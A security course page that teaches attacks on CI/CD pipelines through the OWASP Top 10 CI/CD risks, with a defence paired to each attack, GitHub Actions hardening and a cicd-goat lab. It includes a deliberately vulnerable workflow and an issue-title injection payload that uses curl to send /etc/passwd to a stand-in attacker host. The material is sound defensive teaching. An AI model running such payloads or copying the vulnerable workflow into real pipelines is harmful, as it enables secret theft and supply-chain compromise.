---
layout: page
title: "Attacking CI/CD Pipelines"
week_number: "59"
release_date: "2027-06-01"
phase_label: "Phase 12"
phase_name: "SecDevOps"
phase_color: "#10b981"
permalink: /week-59/
---

> Week 59. Phase 12: SecDevOps.
> 
> CI/CD pipelines are high-value targets. A compromised pipeline can push malicious code to production, exfiltrate secrets, or pivot into cloud infrastructure. This is how SolarWinds and the 3CX supply chain attacks happened.
> 
> This week you learn the attack categories and work through hands-on examples in a safe lab environment.

---

# Attacking CI/CD Pipelines

## What You Will Be Able to Do

By the end of this guide you will be able to:

- Explain the OWASP Top 10 CI/CD Security Risks
- Describe poisoned pipeline execution, dependency confusion, and secrets theft
- Identify vulnerabilities in GitHub Actions workflows
- Apply hardening controls to a real CI/CD pipeline

---

## Why CI/CD Pipelines Are High-Value Targets

A CI/CD pipeline has:

- **Code access** - checks out source code
- **Secret access** - cloud credentials, API keys, signing certificates
- **Deployment access** - pushes code to production
- **Infrastructure access** - sometimes provisions or modifies cloud resources

Compromising a pipeline means compromising everything it touches. The SolarWinds attack (2020) was a pipeline compromise. The 3CX supply chain attack (2023) was a pipeline compromise.

---

## OWASP Top 10 CI/CD Security Risks

### CICD-SEC-1: Insufficient Flow Control Mechanisms

Attackers push code directly to the main branch without review.

**Attack:** Find a repo without branch protection rules. Push malicious code directly.

**Defence:** Require pull request reviews. Use branch protection rules.

### CICD-SEC-2: Inadequate Identity and Access Management

Overpermissioned tokens and service accounts.

**Attack:** Steal a CI service account token that has admin access. Use it to pivot.

**Defence:** Scope tokens to minimum required permissions. Rotate regularly.

### CICD-SEC-3: Dependency Chain Abuse

Also called dependency confusion.

**Attack:**
1. Find a private package name used internally (e.g. `mycompany-utils`)
2. Publish a malicious package with the same name to the public registry (PyPI, npm)
3. Package managers often prefer the higher version number from the public registry
4. The malicious package executes code when installed during CI

**Defence:** Use private package mirrors. Pin exact versions. Verify package checksums.

### CICD-SEC-4: Poisoned Pipeline Execution (PPE)

**Attack:** A contributor opens a pull request that modifies a CI workflow file. The modified workflow runs with the target repo's secrets.

Example vulnerable workflow:
```yaml
on:
  pull_request:
  pull_request_target:    # dangerous: runs with repo secrets for external PRs

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3  # checks out attacker's code
      - run: ${{ github.event.pull_request.head.ref }}  # executes attacker input
```

**Defence:** Never use `pull_request_target` with `actions/checkout` without pinning to a safe ref. Treat PR content as untrusted.

### CICD-SEC-5: Insufficient Credentials Hardening

Secrets stored insecurely in pipelines.

**Attack:** Read environment variables from a compromised build step. Print `env` to logs.

**Defence:** Use secret masking. Never `echo` secrets. Use short-lived credentials.

### CICD-SEC-6: Insufficient Artifact Integrity Validation

Downloading build artifacts without verifying their integrity.

**Attack:** Perform a man-in-the-middle attack on artifact downloads. Replace legitimate binaries.

**Defence:** Verify checksums and signatures. Use pinned SHAs for third-party actions.

### CICD-SEC-7: Insecure System Configuration

Exposed CI dashboards, weak authentication.

**Attack:** Access an unauthenticated Jenkins instance. Trigger a build with a malicious Jenkinsfile.

**Defence:** Require authentication. Expose CI only over VPN. Disable anonymous access.

### CICD-SEC-8: Ungoverned Usage of 3rd Party Services

Untrusted third-party GitHub Actions.

**Attack:** Publish a malicious GitHub Action with a similar name to a popular one. Wait for users to use it.

**Defence:** Pin all third-party actions to a specific commit SHA, not a tag:

```yaml
# Vulnerable - tag can be moved to point to malicious code
- uses: actions/checkout@v4

# Secure - SHA is immutable
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

### CICD-SEC-9: Improper Artifact Distribution

Pushing to registries without proper validation.

**Attack:** Compromise the registry credentials and push a backdoored image that gets deployed to production.

**Defence:** Sign images with Sigstore/cosign. Verify signatures before deployment.

### CICD-SEC-10: Insufficient Logging and Visibility

No audit trail of pipeline executions.

**Attack:** Cover tracks by deleting pipeline run logs after a compromise.

**Defence:** Ship CI logs to a separate, tamper-evident system. Alert on unusual pipeline activity.

---

## GitHub Actions Specific Risks

### Secret Exposure via Workflow Logs

```yaml
# NEVER do this
- run: echo "My secret is ${{ secrets.API_KEY }}"

# Secrets are masked in logs but can leak through other means:
# - Error messages that include the secret value
# - Base64 encoding (not masked)
# - Writing to a file that gets printed
```

### Dangerous Triggers

```yaml
# pull_request_target runs with secrets even for external PRs
on:
  pull_request_target:

# workflow_run can inherit permissions from the triggering workflow
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
```

### Injecting Inputs

```yaml
# VULNERABLE: attacker controls issue title
- name: Process issue
  run: echo "${{ github.event.issue.title }}"
  # Attacker title: "; curl attacker.com/$(cat /etc/passwd) ;"
```

Use `$ENV_VAR` instead of `${{ }}` for user-controlled input.

---

## cicd-goat Lab

cicd-goat is a deliberately vulnerable CI/CD environment for learning:

```bash
# Clone and start
git clone https://github.com/cider-security-research/cicd-goat
cd cicd-goat
docker compose up -d

# Access Gitea (git server) at localhost:3000
# Access Jenkins at localhost:8080
# Access Gitea credentials: gitea-admin / password
```

Challenges include: PPE, dependency confusion, secrets theft, and misconfigured permissions.

---

## Key Things to Remember

- CI/CD pipelines have access to everything - treat them as critical infrastructure
- Pin third-party actions to commit SHAs, not version tags
- `pull_request_target` is dangerous - understand it before using it
- Dependency confusion can happen without any code change
- Secrets in logs are compromised even if the log is later deleted

---

## Activity: Identify and Exploit CI/CD Vulnerabilities

1. Read OWASP's Top 10 CI/CD Security Risks (https://owasp.org/www-project-top-10-ci-cd-security-risks/). Take notes on each category
1. Work through the Pwn the Pipeline challenges at https://github.com/cider-security-research/cicd-goat -- start with the first 3 challenges
1. In your own GitHub Actions workflow, identify: are secrets scoped correctly? Could a pull request from a fork trigger workflows with access to secrets?
1. Add a branch protection rule to your personal-mentor-guide equivalent repo: require PR reviews before merging to main
1. Add a step to your CI that verifies the integrity of third-party actions using pinned SHA commits (not @v1 tags)
1. Write a one-page threat model for a CI/CD pipeline: what are the 3 most critical attack surfaces?
1. You know you are done when you have completed 3 cicd-goat challenges and hardened your own workflow

---

## Check-in Questions

Write your answers down before your next session.

1. What is a poisoned pipeline execution (PPE) attack?
2. Why is using @v1 instead of a pinned SHA for GitHub Actions a security risk?
3. What is dependency confusion and how does it work?
4. What secrets might an attacker look for inside a CI/CD environment?
